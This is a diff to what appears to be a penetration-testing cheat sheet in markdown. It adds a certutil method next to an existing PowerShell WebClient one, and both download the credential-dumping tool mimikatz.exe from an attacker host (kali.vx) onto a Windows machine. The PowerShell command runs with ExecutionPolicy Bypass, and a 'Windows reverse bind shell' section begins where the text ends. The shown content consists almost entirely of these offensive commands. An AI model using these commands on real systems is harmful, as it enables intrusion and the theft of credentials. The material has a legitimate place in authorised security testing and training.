@@ -60,10 +60,21 @@ sudo python3 -m http.server 80 &> /dev/null &
 ```
 
 ### Downloading:
+
+1. Using PowerShell `System.Net.WebClient`
+
 ```console
 set SRC_URL=http://kali.vx/mimikatz.exe
 set DST_PATH=%USERPROFILE%\mimikatz.exe
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH)
+```
+
+2. Using `certutil`
+
+```console
+set SRC_URL=http://kali.vx/mimikatz.exe
+set DST_PATH=%USERPROFILE%\mimikatz.exe
+certutil.exe -urlcache -f -split %SRC_URL% %DST_PATH%
 ```
 
 ## Windows reverse bind shell
